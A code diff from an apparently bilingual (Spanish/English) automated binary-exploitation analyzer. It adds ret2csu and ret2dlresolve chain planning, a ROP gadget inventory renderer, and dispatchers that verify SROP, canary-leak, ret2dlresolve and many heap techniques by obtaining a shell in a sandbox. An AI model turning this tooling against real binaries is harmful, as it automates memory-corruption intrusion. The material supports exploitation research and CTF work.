+            c.sim_result, c.verified, c.proof = _verify_chain(binary, "srop", f, lang)
+        chains.append(c)
+
+    # 11c) ret2csu: binario x86-64 no-PIE con los gadgets universales de __libc_csu_init (detectados
+    # en el arsenal) -> controla rdi/rsi/rdx y hace una llamada indirecta SIN pop rsi/rdx directos.
+    _csu = (_arsenal.get("ret2csu") if _bits == 64 else None)
+    if _csu and _csu.get("complete") and not f.get("pie"):
+        c = ExploitChain(name="ret2csu", target="call(target, arg1, arg2, arg3)")
+        c.requirements = [
+            _req(rip, "control de RIP", "RIP control", lang),
+            _req(True, f"gadget1 (pop rbx..r15) @ {_csu.get('gadget1')}",
+                 f"gadget1 (pop rbx..r15) @ {_csu.get('gadget1')}", lang),
+            _req(True, f"gadget2 (mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]) @ {_csu.get('gadget2')}",
+                 f"gadget2 (mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]) @ {_csu.get('gadget2')}", lang),
+            _req(True, "puntero a funcion conocido para `call [r12+rbx*8]` (p.ej. GOT/.data)",
+                 "a known function pointer for `call [r12+rbx*8]` (e.g. GOT/.data)", lang)]
+        c.regs_needed = ["rdi", "rsi", "rdx"]
+        c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
+        c.constraints.append(L(
+            "arg1 pasa por edi (mov edi, r13d): se trunca a 32 bits; requiere alinear la pila 16B "
+            "(ret-slide) antes de llamar a funciones glibc (MOVAPS)",
+            "arg1 goes through edi (mov edi, r13d): truncated to 32 bits; needs 16B stack alignment "
+            "(a ret-slide) before calling glibc functions (MOVAPS)"))
+        c.steps = [
+            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+            ChainStep("gadget", "gadget1 (pop rbx,rbp,r12,r13,r14,r15)",
+                      L("rbx=0, rbp=1, r12=&fnptr, r13=arg1, r14=arg2, r15=arg3",
+                        "rbx=0, rbp=1, r12=&fnptr, r13=arg1, r14=arg2, r15=arg3"),
+                      addr=int(_csu["gadget1"], 16),
+                      regs={"rbx": "0", "r12": "&fnptr", "r13": "arg1", "r14": "arg2", "r15": "arg3"}),
+            ChainStep("gadget", "gadget2 (mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8])",
+                      L("fija rdx=r15, rsi=r14, edi=r13d y llama a fnptr",
+                        "sets rdx=r15, rsi=r14, edi=r13d and calls fnptr"),
+                      addr=int(_csu["gadget2"], 16),
+                      regs={"rdi": "arg1", "rsi": "arg2", "rdx": "arg3"}),
+            ChainStep("target", "target(arg1, arg2, arg3)",
+                      L("llamada con los 3 argumentos controlados", "call with all 3 arguments controlled"))]
+        _score(c)
+        if verify and _should_attempt_verify(c, f):
+            c.sim_result, c.verified, c.proof = _verify_chain(binary, "csu", f, lang)
+        chains.append(c)
+
+    # 12) ret2dlresolve: dinamico no-PIE, Partial RELRO, SIN win()/system() ni leak. Se forjan las
+    # estructuras del enlazador dinamico (Elf64_Rela/Sym/Str) para que resuelva y llame a
+    # system('/bin/sh') sin fugar libc. No aplica a estaticos (no hay resolver) ni a Full RELRO
+    # (BIND_NOW resuelve todo al cargar). Es ruta de ultimo recurso cuando no hay win/system/leak.
+    if (not f.get("pie") and f.get("static") is not True and str(f.get("relro", "")).lower() != "full"
+            and f.get("win") is None and f.get("system") is None):
+        c = ExploitChain(name="ret2dlresolve", target="system('/bin/sh') (sin leak)")
+        c.requirements = [
+            _req(rip, "control de RIP", "RIP control", lang),
+            _req(True, "binario dinamico no-PIE (direcciones fijas, resolver perezoso presente)",
+                 "dynamic no-PIE binary (fixed addresses, lazy resolver present)", lang),
+            _req(str(f.get("relro", "")).lower() != "full",
+                 "RELRO parcial/none (Full RELRO elimina la resolucion perezosa)",
+                 "Partial/no RELRO (Full RELRO removes lazy resolution)", lang),
+            _req(True, "gadgets para read(0, data) (pop rdi/rsi/rdx)",
+                 "gadgets for read(0, data) (pop rdi/rsi/rdx)", lang)]
+        c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
+        c.steps = [
+            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+            ChainStep("primitive", L("read(0, data) a region escribible", "read(0, data) into a writable region"),
+                      L("una cadena ROP lee las estructuras forjadas del resolver a una direccion fija",
+                        "a ROP chain reads the forged resolver structures to a fixed address")),
+            ChainStep("gadget", L("forjar Elf64_Rela/Sym/Str", "forge Elf64_Rela/Sym/Str"),
+                      L("indice de reubicacion que apunta a un simbolo 'system' falso",
+                        "relocation index pointing at a fake 'system' symbol")),
+            ChainStep("target", "system('/bin/sh')",
+                      L("se invoca el stub PLT-0 (resolver) con el indice forjado -> resuelve y llama a system",
+                        "call the PLT-0 resolver stub with the forged index -> resolves and calls system"))]
+        _score(c)
+        if verify and _should_attempt_verify(c, f):
+            c.sim_result, c.verified, c.proof = _verify_chain(binary, "dlresolve", f, lang)
+        chains.append(c)
+
     # sim_result por defecto (bilingue) para las no simuladas
     for ch in chains:
         if ch.sim_result == "no simulada":
@@ -867,6 +1615,81 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
         an.note = L("sin gadgets enumerados (binario pequeno/dinamico); el analisis se basa en primitivas.",
                     "no gadgets enumerated (small/dynamic binary); the analysis relies on primitives.")
     return an
+
+
+def analyze_arsenal(binary: str, reg=None, lang: str = "es") -> dict:
+    """Superficie dedicada al arsenal ROP: enumera gadgets y devuelve el arsenal (control de
+    registros, syscall, pivote, write-what-where, movimientos, cobertura execve, ret2csu,
+    one_gadget) sin construir ni puntuar cadenas. Grounded; nada se ejecuta."""
+    f = _facts(binary, reg)
+    if f.get("bintype") not in (None, "elf"):
+        return {"ok": True, "applicable": False, "arch": f.get("arch"),
+                "note": (f"arsenal ROP no aplicable: binario {f.get('bintype')} "
+                         f"({f.get('arch','?')}), no ELF/Linux x86" if lang == "es" else
+                         f"ROP arsenal not applicable: {f.get('bintype')} "
+                         f"({f.get('arch','?')}) binary, not ELF/Linux x86")}
+    gadgets = _enum_gadgets(binary, bits=(32 if _is32(f.get("arch")) else 64))
+    arsenal = _full_arsenal(binary, gadgets, f)
+    return {"ok": True, "applicable": True, "arch": f.get("arch"),
+            "static": f.get("static"), "pie": f.get("pie"), "arsenal": arsenal}
+
+
+def render_arsenal(r: dict, lang: str = "es") -> str:
+    es = lang == "es"
+    out = ["## Arsenal ROP (estatico, fundamentado)\n"]
+    if not r.get("ok"):
+        return "\n".join(out + ["No disponible: " + (r.get("note") or "")])
+    if not r.get("applicable"):
+        return "\n".join(out + ["- " + (r.get("note") or "no aplicable")])
+    ars = r.get("arsenal") or {}
+    _b = ars.get("bits", 64)
+    _order = _arg_regs(_b) + [_acc(_b)]
+    out.append(f"- arquitectura: {r.get('arch')}  |  estatico: {r.get('static')}  |  PIE: {r.get('pie')}")
+    out.append(f"- gadgets clasificados: {ars.get('total_gadgets', 0)}")
+    argregs = ars.get("arg_regs") or {}
+    if argregs:
+        out.append(f"\n### Control de registros ({'syscall x86-32: ebx, ecx, edx, esi, edi, eax' if _b == 32 else 'SysV x86-64: rdi, rsi, rdx, rcx, r8, r9, rax'})")
+        for rg in _order:
+            g = argregs.get(rg)
+            if g:
+                cl = (" | clobbers: " + ", ".join(g["clobbers"])) if g.get("clobbers") else ""
+                out.append(f"- **{rg.upper()}**: `{g['text']}` @ {g['addr']} (delta {g['delta']}B{cl})")
+    if ars.get("syscall"):
+        out.append(f"\n- **syscall**: `{ars['syscall']['text']}` @ {ars['syscall']['addr']}")
+    if ars.get("pivot"):
+        out.append(f"- **pivote de stack**: `{ars['pivot']['text']}` @ {ars['pivot']['addr']}")
+    if ars.get("write"):
+        out.append(f"- **write-what-where**: `{ars['write']['mem_write']}` @ {ars['write']['addr']}")
+    moves = ars.get("moves") or []
+    if moves:
+        out.append("\n### Movimientos reg-a-reg (fijar registros sin `pop`)")
+        for mv in moves[:10]:
+            out.append(f"- {mv['move']}: `{mv['text']}` @ {mv['addr']}")
+    cov = ars.get("execve_coverage") or {}
+    if cov:
+        mark = "COMPLETA" if cov.get("complete") else \
+            f"parcial (tiene: {', '.join(cov.get('have') or []) or 'ninguno'})"
+        _needtxt = "/".join(cov.get("need") or []) + ("+int0x80" if _b == 32 else "+syscall")
+        out.append(f"\n### Cobertura execve-por-syscall ({_needtxt}): **{mark}**")
+    csu = ars.get("ret2csu")
+    if csu:
+        out.append(f"\n### ret2csu (gadget universal __libc_csu_init)")
+        out.append(f"- gadget1 (pop rbx..r15): {csu.get('gadget1')}")
+        out.append(f"- gadget2 (mov rdx/rsi/edi; call [r12+rbx*8]): {csu.get('gadget2')}")
+        out.append(f"- {'completo' if csu.get('complete') else 'parcial'}: controla rdi/rsi/rdx sin `pop` directos")
+    og = ars.get("one_gadget")
+    if og:
+        out.append("\n### one_gadget (magic gadgets de libc estatica embebida)")
+        if og.get("available"):
+            out.append(f"- {og.get('count')} gadget(s): {', '.join(og.get('offsets') or [])}")
+            out.append(f"- {og.get('note')}")
+            out.append(f"- {og.get('constraints')}")
+        else:
+            out.append(f"- no disponible: {og.get('note')}")
+    out.append("\n_fundamentado en el binario; presencia de gadgets/tecnicas, no cadenas verificadas_"
+               if es else
+               "\n_grounded in the binary; gadget/technique presence, not verified chains_")
+    return "\n".join(out)
 
 
 def _build_graph(an: ChainAnalysis) -> dict:
@@ -1013,6 +1836,33 @@ def _verify_chain(binary: str, kind: str, facts: dict, lang: str):
                 proof["system"] = m.group(1)
             return ((f"{OK} (tcache dup: GOT sobrescrito con system, shell en sandbox)" if v
                      else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
+        if kind in ("hof", "hos", "hoe", "botcake", "largebin", "stash", "hoc", "unlink", "fastdup", "homind", "fsop"):
+            _HEAP_VERIFY = {
+                "hof": ("autohof", "autohof", "house-of-force (top-chunk -> alloc arbitraria -> win)"),
+                "hos": ("autohos", "autohos", "house-of-spirit (chunk falso en tcache real -> win)"),
+                "hoe": ("autohoe", "autohoe", "house-of-einherjar (consolidacion hacia atras -> win)"),
+                "botcake": ("autobotcake", "autobotcake", "house-of-botcake (doble-free via unsorted -> overlap -> win)"),
+                "largebin": ("autolargebin", "autolargebin", "largebin attack (escritura de insercion -> win)"),
+                "stash": ("autostash", "autostash", "tcache stashing unlink (stash smallbin->tcache -> win)"),
+                "hoc": ("autohoc", "autohoc", "house-of-corrosion (global_max_fast -> fastbin index write -> win)"),
+                "unlink": ("autounsafeunlink", "autounsafeunlink", "unsafe-unlink (unlink write + 2.3.4+ bypass -> win)"),
+                "fastdup": ("autofastbindup", "autofastbindup", "fastbin-dup clasico (doble-free -> fd poison -> win)"),
+                "homind": ("autohomind", "autohomind", "house-of-mind (arena forjada -> fastbin insertion write -> win)"),
+                "fsop": ("autoiofile", "autoiofile", "IO_FILE/FSOP (vtable hijack -> __overflow -> win)"),
+            }
+            mod, fn, strat = _HEAP_VERIFY[kind]
+            run = getattr(__import__(f"binoracle.workflows.{mod}", fromlist=[fn]), fn)
+            r = run(binary)
+            v = bool(r.get("verified"))
+            detail = r.get("detail", "") or ""
+            proof = {"strategy": strat, "marker": f"BINORACLE_{kind.upper()}_PWNED",
+                     "output": (r.get("output", "") or "")[-300:]}
+            for key in ("win", "handler", "slot", "hobj", "hook", "a", "heap"):
+                m = _re_cv.search(rf"\b{key}=(0x[0-9a-fA-F]+)", detail)
+                if m:
+                    proof[key] = m.group(1)
+            return ((f"{OK} ({strat}, shell en sandbox)" if v
+                     else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
         if kind == "ret2libc_leak":
             from .autolibc import autolibc
             r = autolibc(binary, run=True)
@@ -1024,6 +1874,69 @@ def _verify_chain(binary: str, kind: str, facts: dict, lang: str):
                 if m:
                     proof["offset" if key == "off" else key] = m.group(1)
             return ((f"{OK} (ret2libc con fuga de libc: base={proof.get('base')}, shell en sandbox)" if v
+                     else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
+        if kind == "csu":
+            from .autocsu import autocsu
+            r = autocsu(binary)
+            v = bool(r.get("verified"))
+            detail = r.get("detail", "") or ""
+            proof = {"strategy": "ret2csu (__libc_csu_init -> call con args controlados)",
+                     "marker": "BINORACLE_CSU_PWNED", "output": (r.get("output", "") or "")[-300:]}
+            for key in ("g1", "g2", "fnptr"):
+                m = _re_cv.search(rf"{key}=(0x[0-9a-fA-F]+)", detail)
+                if m:
+                    proof[key] = m.group(1)
+            m = _re_cv.search(r"off=(\d+)", detail)
+            if m:
+                proof["offset"] = int(m.group(1))
+            return ((f"{OK} (ret2csu: rdi/rsi/rdx controlados via __libc_csu_init -> call, shell en sandbox)" if v
+                     else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
+        if kind == "srop":
+            from .autosrop import autosrop
+            r = autosrop(binary)
+            v = bool(r.get("verified"))
+            detail = r.get("detail", "") or ""
+            proof = {"strategy": "SROP (sigreturn -> execve)", "marker": "BINORACLE_SROP_PWNED",
+                     "output": (r.get("output", "") or "")[-300:]}
+            for key in ("syscall", "binsh"):
+                m = _re_cv.search(rf"{key}=(0x[0-9a-fA-F]+)", detail)
+                if m:
+                    proof[key] = m.group(1)
+            m = _re_cv.search(r"off=(\d+)", detail)
+            if m:
+                proof["offset"] = int(m.group(1))
+            return ((f"{OK} (SROP: rt_sigreturn restaura el frame forjado -> execve('/bin/sh'), shell en sandbox)" if v
+                     else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
+        if kind == "dlresolve":
+            from .autodlresolve import autodlresolve
+            r = autodlresolve(binary)
+            v = bool(r.get("verified"))
+            detail = r.get("detail", "") or ""
+            proof = {"strategy": "ret2dlresolve (shell sin leak de libc)", "marker": "BINORACLE_DLR_PWNED",
+                     "output": (r.get("output", "") or "")[-300:]}
+            m = _re_cv.search(r"data=(0x[0-9a-fA-F]+)", detail)
+            if m:
+                proof["data_addr"] = m.group(1)
+            m = _re_cv.search(r"off=(\d+)", detail)
+            if m:
+                proof["offset"] = int(m.group(1))
+            return ((f"{OK} (ret2dlresolve: resolver dinamico forjado -> system('/bin/sh'), shell en sandbox)" if v
+                     else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
+        if kind == "canary":
+            from .autocanary import autocanary
+            r = autocanary(binary)
+            v = bool(r.get("verified"))
+            detail = r.get("detail", "") or ""
+            proof = {"strategy": "canary leak (%s) -> rewrite -> overflow -> win()",
+                     "marker": "BINORACLE_PWNED", "output": (r.get("output", "") or "")[-300:]}
+            for key in ("canary", "win"):
+                m = _re_cv.search(rf"{key}=(0x[0-9a-fA-F]+)", detail)
+                if m:
+                    proof[key] = m.group(1)
+            m = _re_cv.search(r"bufsz=(\d+)", detail)
+            if m:
+                proof["offset"] = int(m.group(1))
+            return ((f"{OK} (canary filtrado via %s y reescrito, overflow -> win(), shell en sandbox)" if v
                      else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
         if kind == "ret2win":
             if pie:
